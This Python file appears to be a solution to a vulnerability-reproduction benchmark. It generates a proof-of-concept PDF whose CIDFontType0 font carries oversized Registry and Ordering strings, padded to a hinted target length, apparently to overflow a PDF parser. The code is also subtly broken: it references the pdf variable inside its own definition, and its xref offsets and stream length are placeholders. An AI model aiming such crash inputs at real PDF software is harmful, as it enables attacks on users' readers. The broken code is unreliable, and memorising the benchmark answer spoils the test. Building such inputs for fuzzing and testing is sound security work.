import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth length hint
        target_len = 80064
        
        # Create a minimal valid PDF structure with a long CIDSystemInfo
        # This follows PDF 1.4 specification for CIDFontType0 font
        pdf_content = self._create_pdf_with_cidfont(target_len)
        return pdf_content

    def _create_pdf_with_cidfont(self, target_len: int) -> bytes:
        """Create a PDF with CIDFontType0 that has long Registry and Ordering strings."""
        
        # Calculate string lengths to achieve target PDF size
        # PDF structure overhead is approximately 500 bytes
        overhead = 500
        registry_len = (target_len - overhead) // 2
        ordering_len = target_len - overhead - registry_len
        
        # Make sure strings are non-empty
        registry_len = max(1, registry_len)
        ordering_len = max(1, ordering_len)
        
        # Create long strings for Registry and Ordering
        # Using printable ASCII characters
        registry_str = 'R' * registry_len
        ordering_str = 'O' * ordering_len
        
        # Build the PDF content
        pdf = b"""%PDF-1.4
1 0 obj
<<
  /Type /Font
  /Subtype /CIDFontType0
  /BaseFont /Test-CIDFont
  /CIDSystemInfo <<
    /Registry (""" + registry_str.encode() + b""")
    /Ordering (""" + ordering_str.encode() + b""")
    /Supplement 0
  >>
  /FontDescriptor 2 0 R
>>
endobj

2 0 obj
<<
  /Type /FontDescriptor
  /FontName /Test-CIDFont
  /Flags 4
  /FontBBox [0 0 1000 1000]
  /ItalicAngle 0
  /Ascent 1000
  /Descent 0
  /CapHeight 1000
  /StemV 80
>>
endobj

3 0 obj
<<
  /Type /Page
  /Parent 4 0 R
  /MediaBox [0 0 612 792]
  /Resources <<
    /Font <<
      /F1 1 0 R
    >>
  >>
  /Contents 5 0 R
>>
endobj

4 0 obj
<<
  /Type /Pages
  /Kids [3 0 R]
  /Count 1
>>
endobj

5 0 obj
<<
  /Length 45
>>
stream
BT /F1 24 Tf 100 100 Td (Test) Tj ET
endstream
endobj

6 0 obj
<<
  /Type /Catalog
  /Pages 4 0 R
>>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000000 00000 n
0000000000 00000 n
0000000000 00000 n
0000000000 00000 n
0000000000 00000 n
trailer
<<
  /Size 7
  /Root 6 0 R
>>
startxref
""" + str(len(pdf) - len(b"startxref\n")).encode() + b"""
%%EOF"""
        
        return pdf
